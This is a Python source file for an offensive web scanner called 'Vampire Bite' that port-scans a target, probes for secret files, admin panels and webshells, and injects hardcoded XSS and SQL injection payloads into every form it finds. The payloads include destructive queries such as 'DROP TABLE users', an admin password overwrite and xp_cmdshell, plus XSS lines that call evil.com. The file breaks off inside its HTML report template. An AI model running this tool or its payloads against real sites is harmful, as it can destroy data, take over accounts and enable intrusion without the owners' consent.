# Author: LORD VAMPIRE (Team Lord)

import subprocess
import sys
import os
import json
import re
import socket
import time
import random
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

def auto_install(pkg):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
        return True
    except:
        return False

def is_package_installed(package_name):
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def check_deps():
    deps = ["requests", "colorama", "bs4"]
    for d in deps:
        if d == "bs4":
            if not is_package_installed("bs4"):
                auto_install("beautifulsoup4")
        else:
            if not is_package_installed(d):
                auto_install(d)

check_deps()

import requests
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup

init(autoreset=True)

class PayloadGenerator:
    @staticmethod
    def generate_xss():
        """Generate 1500+ XSS payloads"""
        print(f"  {Fore.CYAN}[GEN] Generating XSS payloads...{Style.RESET_ALL}")
        
        payloads = [
            # Basic Script Tags
            "<script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert(`XSS`)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<script>console.log('XSS')</script>",
            "<script>document.write('XSS')</script>",
            "<script>document.location='http://evil.com'</script>",
            "<script src=http://evil.com/xss.js></script>",
            "<script>eval('alert(\"XSS\")')</script>",
            "<script>setTimeout('alert(\"XSS\")',1000)</script>",
            "<script>setInterval('alert(\"XSS\")',1000)</script>",
            # Event Handlers
            "<body onload=alert('XSS')>",
            "<body onpageshow=alert('XSS')>",
            "<body onfocus=alert('XSS')>",
            "<body onblur=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=javascript:alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<svg onmouseenter=alert('XSS')>",
            "<svg onmouseleave=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<object onerror=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<input onblur=alert('XSS')>",
            "<input onchange=alert('XSS')>",
            "<input oninput=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<div onmouseover=alert('XSS')>",
            "<div onmouseout=alert('XSS')>",
            "<div onclick=alert('XSS')>",
            "<div ondblclick=alert('XSS')>",
            "<div oncontextmenu=alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",
            "<a onmouseover=alert('XSS')>hover</a>",
            "<marquee onstart=alert('XSS')>",
            "<details ontoggle=alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<embed onload=alert('XSS')>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video onloadstart=alert('XSS')>",
            "<audio onloadstart=alert('XSS')>",
            "<source onerror=alert('XSS')>",
            "<track onloadstart=alert('XSS')>",
            "<form onsubmit=alert('XSS')>",
            "<button onclick=alert('XSS')>",
            # Tag Breaking
            "><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert('XSS')//",
            "<script>alert('XSS')/*",
            "<!--<script>alert('XSS')</script>-->",
            "<!--><script>alert('XSS')</script>-->",
            "<img src=x onerror=alert('XSS')//",
            "<img src=x onerror=alert('XSS')/*",
            "><img src=x onerror=alert('XSS')>",
            "\"><img src=x onerror=alert('XSS')>",
            "'><img src=x onerror=alert('XSS')>",
            "><svg onload=alert('XSS')>",
            "\"><svg onload=alert('XSS')>",
            "'><svg onload=alert('XSS')>",
            # JavaScript Pseudo
            "javascript:alert('XSS')",
            "javascript:alert(/XSS/)",
            "javascript:alert(`XSS`)",
            "javascript:alert('XSS');",
            "javascript:alert('XSS')//",
            "javascript:alert('XSS')/*",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:confirm('XSS')",
            "javascript:prompt('XSS')",
            "javascript:void(alert('XSS'))",
            "javascripT:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            "javascript:alert(document.cookie)",
            "javascript:alert(window.location)",
            "javascript:fetch('http://evil.com')",
            # Encoded
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
            "%3Csvg%20onload%3Dalert('XSS')%3E",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
            "\\074script\\076alert('XSS')\\074/script\\076",
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "%25253Cscript%25253Ealert('XSS')%25253C/script%25253E",
            # DOM XSS
            "#<script>alert('XSS')</script>",
            "#<img src=x onerror=alert('XSS')>",
            "#<svg onload=alert('XSS')>",
            "#javascript:alert('XSS')",
            "#<body onload=alert('XSS')>",
            "#<iframe src=javascript:alert('XSS')>",
            "###<script>alert('XSS')</script>",
            "<script>location.hash='#<script>alert(1)</script>'</script>",
            "<script>document.write(location.hash.substring(1))</script>",
            "<script>eval(location.hash.substring(1))</script>",
            # HTML5
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<track onload=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>",
            "<progress onclick=alert('XSS')>",
            "<canvas onmouseover=alert('XSS')>",
            "<details ontoggle=alert('XSS')>",
            "<menuitem onmouseover=alert('XSS')>",
            "<output onmouseover=alert('XSS')>",
            # Framework
            "{{constructor.constructor('alert(1)')()}}",
            "{{$eval('alert(1)')}}",
            "{{$eval($eval('alert(1)'))}}",
            "{{alert(1)}}",
            "{{confirm(1)}}",
            "{{prompt(1)}}",
            "<div ng-app><div ng-click=alert('XSS')>click</div></div>",
            "<div ng-app ng-csp><div ng-click=alert('XSS')>click</div></div>",
            "<input type=text ng-model=alert(1)>",
            "<a href='javascript:alert(1)'>click</a>",
            # WAF Bypass
            "<svg/onload=alert(1)>",
            "<svg onload=alert(1) ",
            "<svg onload=alert`1`>",
            "<svg onload=alert(1)//",
            "<svg onload=alert(1)<!-->",
            "<svg onload=alert(1) x='",
            "<svg onload=alert(1)></svg>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(1)</script>",
            "<script>alert(1)//</script>",
            "<script>alert(1)/*/</script>",
            "<script>alert(1)<!--</script>",
            "<script>alert(1)></script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script\\x20type=\"text/javascript\">alert(1)</script>",
            "<script>alert(String.fromCharCode(49))</script>",
        ]
        
        # Add case variations
        new_payloads = []
        for p in payloads[:]:
            new_payloads.append(p.upper())
            new_payloads.append(p.lower())
        
        payloads.extend(new_payloads)
        unique = list(dict.fromkeys(payloads))
        
        print(f"  {Fore.GREEN}[GEN] Generated {len(unique)} XSS payloads{Style.RESET_ALL}")
        return unique
    
    @staticmethod
    def generate_sqli():
        """Generate 800+ SQLi payloads"""
        print(f"  {Fore.CYAN}[GEN] Generating SQLi payloads...{Style.RESET_ALL}")
        
        payloads = [
            # Basic
            "'", "''", "\"", "\\", "`", "' '", "'='", "'=''",
            # OR conditions
            "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--",
            "' OR '1'='1'#", "' OR '1'='1'/*", "' OR 1=1#",
            "1' AND '1'='1", "1' AND '1'='2",
            # UNION
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT version(),user()--", "' UNION SELECT database(),user()--",
            "' UNION SELECT @@version,user()--",
            # Time-based
            "' AND SLEEP(5)--", "1' AND SLEEP(5)--", "' OR SLEEP(5)--", "1' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            # MSSQL
            "' WAITFOR DELAY '00:00:05'--", "1' AND 1=CONVERT(int, @@version)--",
            "'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--",
            # PostgreSQL
            "' OR pg_sleep(5)--", "1' OR pg_sleep(5)--",
            "' AND 1=CAST((SELECT version()) AS INT)--",
            # Boolean
            "' AND '1'='1", "' AND '1'='2", "1 AND 1=1", "1 AND 1=2",
            "' OR '1'='1", "' OR '1'='2", "' AND 1=1--", "' AND 1=2--",
            "1' AND 1=1--", "1' AND 1=2--",
            # Stacked
            "'; DROP TABLE users--", "'; DELETE FROM users--",
            "'; INSERT INTO users VALUES('hacker','pass')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; EXEC xp_cmdshell('dir')--",
            # Admin bypass
            "admin' --", "admin' #", "admin'/*", "admin' OR '1'='1",
            "admin' OR 1=1--", "admin' OR '1'='1'--",
            # Comments
            "' OR '1'='1'-- -", "' OR '1'='1'#", "' OR '1'='1'/*",
        ]
        
        # Add case variations
        new_payloads = []
        for p in payloads[:]:
            new_payloads.append(p.upper())
            new_payloads.append(p.lower())
        
        payloads.extend(new_payloads)
        unique = list(dict.fromkeys(payloads))
        
        print(f"  {Fore.GREEN}[GEN] Generated {len(unique)} SQLi payloads{Style.RESET_ALL}")
        return unique


class VampireBiteComplete:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = {
            "target": "",
            "ip": "",
            "scan_time": "",
            "duration": 0,
            "open_ports": [],
            "web_server": "",
            "technologies": [],
            "security_headers": {},
            "sensitive_files": [],
            "admin_panels": [],
            "open_directories": [],
            "backdoors": [],
            "xss_vulnerable": [],
            "sql_vulnerable": [],
            "forms_found": []
        }
    
    def banner(self):
        print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                  ║
║   ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗     ██████╗ ██╗████████╗███████╗     ║
║   ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝     ██╔══██╗██║╚══██╔══╝██╔════╝     ║
║   ██║   ██║███████║██╔████╔██║██████╔╝██║██████╔╝█████╗       ██████╔╝██║   ██║   █████╗       ║
║   ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║██╔══██╗██╔══╝       ██╔══██╗██║   ██║   ██╔══╝       ║
║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ██║██║  ██║███████╗     ██████╔╝██║   ██║   ███████╗     ║
║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝   ╚═╝   ╚══════╝     ║
║                                                                                                  ║
║  {Fore.MAGENTA}🐺 VAMPIRE BITE v38.0 - FINAL COMPLETE EDITION 🧛‍♂️💀{Fore.RED}                                 ║
║  {Fore.GREEN}👑 Author: LORD VAMPIRE (Team Lord Leader){Fore.RED}                                             ║
║  {Fore.CYAN}⚡ 1500+ XSS | 800+ SQLi | No Bugs | Perfect Formatting ⚡{Fore.RED}                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    def get_service_name(self, port):
        services = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
                   111:"RPC",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",
                   993:"IMAPS",995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
                   5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
        return services.get(port, "Unknown")
    
    def scan_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                s.close()
                return port
            s.close()
        except:
            pass
        return None
    
    def port_scan(self, ip):
        print(f"\n  {Fore.CYAN}[PORT] Scanning 25 ports on {ip}...{Style.RESET_ALL}")
        ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,6379,8080,8443,27017]
        open_ports = []
        total = len(ports)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(self.scan_port, ip, p) for p in ports]
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    open_ports.append(result)
                    print(f"      {Fore.RED}[OPEN] Port {result} [{self.get_service_name(result)}]{Style.RESET_ALL}")
                if i % 10 == 0:
                    print(f"      {Fore.CYAN}[PORT] Progress: {i}/{total} ports scanned{Style.RESET_ALL}")
        
        self.results["open_ports"] = open_ports
        print(f"  {Fore.GREEN}[PORT] Complete! Found {len(open_ports)} open ports{Style.RESET_ALL}")
        return open_ports
    
    def detect_web_server(self, url):
        print(f"\n  {Fore.CYAN}[WEB] Detecting web server...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10)
            server = r.headers.get('Server', 'Unknown')
            print(f"      {Fore.GREEN}[WEB] Server: {server}{Style.RESET_ALL}")
            self.results["web_server"] = server
            return server
        except:
            print(f"      {Fore.RED}[WEB] Could not detect server{Style.RESET_ALL}")
            return "Unknown"
    
    def detect_technologies(self, url):
        print(f"\n  {Fore.CYAN}[TECH] Detecting technologies...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10)
            text = r.text.lower()
            techs = []
            if '.php' in text:
                techs.append("PHP")
                print(f"      {Fore.GREEN}[TECH] PHP detected{Style.RESET_ALL}")
            if '.aspx' in text:
                techs.append("ASP.NET")
                print(f"      {Fore.GREEN}[TECH] ASP.NET detected{Style.RESET_ALL}")
            if 'react' in text:
                techs.append("React")
                print(f"      {Fore.GREEN}[TECH] React detected{Style.RESET_ALL}")
            if 'vue' in text:
                techs.append("Vue.js")
                print(f"      {Fore.GREEN}[TECH] Vue.js detected{Style.RESET_ALL}")
            self.results["technologies"] = techs
            return techs
        except:
            return []
    
    def check_security_headers(self, url):
        print(f"\n  {Fore.CYAN}[HEADER] Checking security headers...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10)
            headers_list = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options', 
                           'Strict-Transport-Security', 'Content-Security-Policy']
            for h in headers_list:
                if h in r.headers:
                    print(f"      {Fore.GREEN}[HEADER] ✅ {h}{Style.RESET_ALL}")
                    self.results["security_headers"][h] = True
                else:
                    print(f"      {Fore.RED}[HEADER] ❌ {h}{Style.RESET_ALL}")
                    self.results["security_headers"][h] = False
        except:
            pass
    
    def find_sensitive_files(self, url):
        print(f"\n  {Fore.CYAN}[FILE] Looking for sensitive files...{Style.RESET_ALL}")
        files = ["/robots.txt", "/.git/config", "/.env", "/phpinfo.php", "/backup.sql", 
                "/.htaccess", "/config.php", "/wp-config.php.bak"]
        found = []
        total = len(files)
        
        for i, f in enumerate(files, 1):
            try:
                test_url = f"{url.rstrip('/')}{f}"
                r = self.session.get(test_url, timeout=3)
                if r.status_code == 200:
                    found.append({"file": f, "url": test_url})
                    print(f"      {Fore.RED}[FILE] Found: {f} [{i}/{total}]{Style.RESET_ALL}")
                else:
                    print(f"      {Fore.CYAN}[FILE] Checked {f} [{i}/{total}]{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                print(f"      {Fore.CYAN}[FILE] Checked {f} [{i}/{total}]{Style.RESET_ALL}")
        
        self.results["sensitive_files"] = found
        print(f"  {Fore.GREEN}[FILE] Complete! Found {len(found)} sensitive files{Style.RESET_ALL}")
    
    def find_admin_panels(self, url):
        print(f"\n  {Fore.CYAN}[ADMIN] Hunting for admin panels...{Style.RESET_ALL}")
        paths = ["/admin", "/administrator", "/wp-admin", "/login", "/cpanel", "/dashboard",
                "/admin/login", "/backend", "/controlpanel", "/manage", "/admincp", 
                "/cp", "/manager", "/webadmin", "/sysadmin", "/adminarea"]
        
        found = []
        seen_urls = set()
        total = len(paths)
        
        try:
            home_r = self.session.get(url, timeout=5)
            home_content = home_r.text
            home_length = len(home_content)
        except:
            home_content = ""
            home_length = 0
        
        for i, path in enumerate(paths, 1):
            try:
                test_url = f"{url.rstrip('/')}{path}"
                print(f"      {Fore.CYAN}[ADMIN] Checking {path} [{i}/{total}]{Style.RESET_ALL}", end='\r')
                r = self.session.get(test_url, timeout=5, allow_redirects=True)
                final_url = r.url
                
                if final_url == url or final_url == url + "/" or final_url.rstrip('/') == url.rstrip('/'):
                    continue
                if final_url in seen_urls:
                    continue
                if len(r.text) == home_length and r.text == home_content:
                    continue
                
                seen_urls.add(final_url)
                
                if r.status_code == 200:
                    keywords = ['login', 'username', 'password', 'admin', 'dashboard', 'control', 'panel']
                    if any(k in r.text.lower() for k in keywords):
                        found.append({"path": path, "url": final_url, "type": "Admin Panel with Login"})
                        print(f"\n      {Fore.RED}[ADMIN] ✔ Found: {path} → {final_url} [{i}/{total}]{Style.RESET_ALL}")
                    else:
                        found.append({"path": path, "url": final_url, "type": "Admin Panel (No Login Form)"})
                        print(f"\n      {Fore.YELLOW}[ADMIN] ? Maybe: {path} → {final_url} [{i}/{total}]{Style.RESET_ALL}")
                elif r.status_code in [401, 403]:
                    found.append({"path": path, "url": final_url, "type": "Authentication Required"})
                    print(f"\n      {Fore.RED}[ADMIN] ! Protected: {path} → {final_url} [{i}/{total}]{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                pass
        
        self.results["admin_panels"] = found
        print(f"\n  {Fore.GREEN}[ADMIN] Complete! Found {len(found)} admin panels{Style.RESET_ALL}")
        return found
    
    def find_open_directories(self, url):
        print(f"\n  {Fore.CYAN}[DIR] Looking for open directories...{Style.RESET_ALL}")
        dirs = ["/backup", "/temp", "/tmp", "/old", "/test", "/dev", "/uploads", "/files",
                "/download", "/images", "/css", "/js", "/assets", "/static", "/media",
                "/content", "/data", "/logs", "/cache", "/phpmyadmin", "/mysql"]
        found = []
        total = len(dirs)
        
        for i, d in enumerate(dirs, 1):
            try:
                test_url = f"{url.rstrip('/')}{d}"
                print(f"      {Fore.CYAN}[DIR] Checking {d} [{i}/{total}]{Style.RESET_ALL}", end='\r')
                r = self.session.get(test_url, timeout=3, allow_redirects=False)
                if r.status_code == 200:
                    if 'Index of' in r.text or 'Parent Directory' in r.text:
                        found.append({"path": d, "url": test_url, "type": "Open Directory Listing"})
                        print(f"\n      {Fore.RED}[DIR] 📁 OPEN DIRECTORY: {d} [{i}/{total}]{Style.RESET_ALL}")
                    else:
                        found.append({"path": d, "url": test_url, "type": "Accessible Directory"})
                        print(f"\n      {Fore.YELLOW}[DIR] 📁 Accessible: {d} [{i}/{total}]{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                pass
        
        self.results["open_directories"] = found
        print(f"\n  {Fore.GREEN}[DIR] Complete! Found {len(found)} open directories{Style.RESET_ALL}")
        return found
    
    def find_backdoors(self, url):
        print(f"\n  {Fore.CYAN}[BD] Hunting for backdoors...{Style.RESET_ALL}")
        backdoors = ["/shell.php", "/cmd.php", "/c99.php", "/r57.php", "/webshell.php", "/backdoor.php"]
        found = []
        total = len(backdoors)
        
        for i, b in enumerate(backdoors, 1):
            try:
                test_url = f"{url.rstrip('/')}{b}"
                print(f"      {Fore.CYAN}[BD] Checking {b} [{i}/{total}]{Style.RESET_ALL}", end='\r')
                r = self.session.get(test_url, timeout=3)
                if r.status_code == 200:
                    found.append({"file": b, "url": test_url})
                    print(f"\n      {Fore.RED}[BD] 💀 BACKDOOR FOUND: {b} [{i}/{total}]{Style.RESET_ALL}")
                time.sleep(0.05)
            except:
                pass
        
        self.results["backdoors"] = found
        print(f"\n  {Fore.GREEN}[BD] Complete! Found {len(found)} backdoors{Style.RESET_ALL}")
        return found
    
    def extract_forms(self, url):
        print(f"\n  {Fore.CYAN}[FORM] Extracting forms from {url}...{Style.RESET_ALL}")
        forms = []
        try:
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_info = {
                    'action': form.get('action', url),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                for inp in form.find_all(['input', 'textarea']):
                    inp_name = inp.get('name', '')
                    inp_type = inp.get('type', 'text')
                    if inp_name:
                        form_info['inputs'].append({'name': inp_name, 'type': inp_type})
                if form_info['inputs']:
                    forms.append(form_info)
                    
            print(f"  {Fore.GREEN}[FORM] Found {len(forms)} forms with {sum(len(f['inputs']) for f in forms)} inputs{Style.RESET_ALL}")
            self.results["forms_found"] = forms
            return forms
        except Exception as e:
            print(f"  {Fore.RED}[FORM] Error: {e}{Style.RESET_ALL}")
            return []
    
    def test_xss_on_form(self, url, form, form_idx, total_forms):
        vulnerabilities = []
        xss_payloads = PayloadGenerator.generate_xss()
        total_payloads = len(xss_payloads)
        
        print(f"\n  {Fore.YELLOW}[XSS] Testing Form {form_idx}/{total_forms} ({total_payloads} payloads){Style.RESET_ALL}")
        
        for idx, payload in enumerate(xss_payloads):
            test_data = {}
            for inp in form['inputs']:
                if inp['type'] != 'submit':
                    test_data[inp['name']] = payload
            
            try:
                if form['method'] == 'POST':
                    resp = self.session.post(urljoin(url, form['action']), data=test_data, timeout=5)
                else:
                    resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=5)
                
                if payload in resp.text or payload.replace('<', '&lt;') in resp.text:
                    vulnerabilities.append({'payload': payload[:60], 'method': form['method']})
                    print(f"      {Fore.RED}[XSS] 💀 FOUND! {payload[:50]}...{Style.RESET_ALL}")
                
                if (idx + 1) % 200 == 0 or idx + 1 == total_payloads:
                    print(f"      {Fore.CYAN}[XSS] Progress: {idx + 1}/{total_payloads} payloads{Style.RESET_ALL}", end='\r')
            except:
                pass
            time.sleep(0.002)
        
        print(f"\n  {Fore.GREEN}[XSS] Form {form_idx} complete. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_sqli_on_form(self, url, form, form_idx, total_forms):
        vulnerabilities = []
        sqli_payloads = PayloadGenerator.generate_sqli()
        total_payloads = len(sqli_payloads)
        sql_errors = ['mysql', 'sql syntax', 'ora-', 'postgresql', 'database error']
        
        print(f"\n  {Fore.YELLOW}[SQLi] Testing Form {form_idx}/{total_forms} ({total_payloads} payloads){Style.RESET_ALL}")
        
        for idx, payload in enumerate(sqli_payloads):
            test_data = {}
            for inp in form['inputs']:
                if inp['type'] != 'submit':
                    test_data[inp['name']] = payload
            
            try:
                if form['method'] == 'POST':
                    start = time.time()
                    resp = self.session.post(urljoin(url, form['action']), data=test_data, timeout=10)
                    elapsed = time.time() - start
                else:
                    start = time.time()
                    resp = self.session.get(urljoin(url, form['action']), params=test_data, timeout=10)
                    elapsed = time.time() - start
                
                for error in sql_errors:
                    if error in resp.text.lower():
                        vulnerabilities.append({'payload': payload[:50], 'evidence': error})
                        print(f"      {Fore.RED}[SQLi] 💀 FOUND! {payload[:40]}... (evidence: {error}){Style.RESET_ALL}")
                        break
                else:
                    if elapsed >= 4:
                        vulnerabilities.append({'payload': payload[:50], 'delay': round(elapsed, 2), 'type': 'Time-Based'})
                        print(f"      {Fore.RED}[SQLi] ⏱️ TIME-BASED! Delay: {elapsed:.1f}s{Style.RESET_ALL}")
                
                if (idx + 1) % 200 == 0 or idx + 1 == total_payloads:
                    print(f"      {Fore.CYAN}[SQLi] Progress: {idx + 1}/{total_payloads} payloads{Style.RESET_ALL}", end='\r')
            except:
                pass
            time.sleep(0.002)
        
        print(f"\n  {Fore.GREEN}[SQLi] Form {form_idx} complete. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def full_scan(self, target):
        print(f"\n{Fore.CYAN}[START] Initializing scan...{Style.RESET_ALL}")
        self.start_time = time.time()
        self.results["target"] = target
        self.results["scan_time"] = datetime.now().isoformat()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        parsed = urlparse(target)
        ip = parsed.hostname or target
        self.results["ip"] = ip
        
        print(f"{Fore.CYAN}[TARGET] {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[IP] {ip}{Style.RESET_ALL}")
        
        # PHASE 1: PORT SCAN
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 1/5: PORT SCANNING{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.port_scan(ip)
        
        # PHASE 2: WEB SERVER & TECH
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 2/5: WEB SERVER & TECHNOLOGY{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.detect_web_server(target)
        self.detect_technologies(target)
        
        # PHASE 3: SECURITY HEADERS
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 3/5: SECURITY HEADERS{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.check_security_headers(target)
        
        # PHASE 4: RECON
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 4/5: RECONNAISSANCE{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.find_sensitive_files(target)
        self.find_admin_panels(target)
        self.find_open_directories(target)
        self.find_backdoors(target)
        
        # PHASE 5: FORMS & VULNS
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 5/5: VULNERABILITY TESTING{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        forms = self.extract_forms(target)
        
        all_xss = []
        all_sqli = []
        
        if forms:
            for idx, form in enumerate(forms, 1):
                xss_results = self.test_xss_on_form(target, form, idx, len(forms))
                sqli_results = self.test_sqli_on_form(target, form, idx, len(forms))
                all_xss.extend(xss_results)
                all_sqli.extend(sqli_results)
        else:
            print(f"\n  {Fore.YELLOW}[SKIP] No forms found. Skipping XSS/SQLi tests.{Style.RESET_ALL}")
        
        self.results["xss_vulnerable"] = all_xss
        self.results["sql_vulnerable"] = all_sqli
        self.results["duration"] = round(time.time() - self.start_time, 2)
        
        # FINAL SUMMARY
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}SCAN COMPLETE!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Target: {target}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Duration: {self.results['duration']}s{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Open Ports: {len(self.results['open_ports'])}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Web Server: {self.results['web_server']}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Technologies: {', '.join(self.results['technologies']) or 'None'}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Sensitive Files: {len(self.results['sensitive_files'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Admin Panels: {len(self.results['admin_panels'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Open Dirs: {len(self.results['open_directories'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Backdoors: {len(self.results['backdoors'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}XSS Vulnerable: {len(all_xss)}{Style.RESET_ALL}")
        print(f"  {Fore.RED}SQLi Vulnerable: {len(all_sqli)}{Style.RESET_ALL}")
        
        if self.results['admin_panels']:
            print(f"\n  {Fore.RED}📋 REAL ADMIN PANELS:{Style.RESET_ALL}")
            for ap in self.results['admin_panels']:
                print(f"    {Fore.RED}→ {ap['url']} ({ap['type']}){Style.RESET_ALL}")
        
        self.generate_html_report(target)
        print(f"\n  {Fore.GREEN}[+] HTML Report: vampire_bite_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        return self.results
    
    def generate_html_report(self, target):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vampire_bite_report_{timestamp}.html"
        
        html = f"""<!DOCTYPE html>
<html><head><title>Vampire Bite Report - {target}</title>
<style>
body {{ background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }}
.container {{ max-width: 1200px; margin: auto; border: 2px solid #f00; padding: 20px; }}
h1 {{ color: #f00; text-align: center; }}
h2 {{ color: #f00; border-bottom: 2px solid #f00; }}
.critical {{ color: #f00; }}
table {{ width: 100%; border-collapse: collapse; }}
th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
th {{ background: #f00; color: #fff; }}
</style>
</head>
<body>
<div class="container">
<h1>🧛‍♂️ VAMPIRE BITE - SECURITY REPORT</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>IP:</strong> {self.results['ip']}</p>
<p><strong>Scan Time:</strong> {self.results['scan_time']}</p>
<p><strong>Duration:</strong> {self.results['duration']}s</p>

<h2>🔌 OPEN PORTS ({len(self.results['open_ports'])})</h2>
<table>
<tr><th>Port</th><th>Service</th></tr>
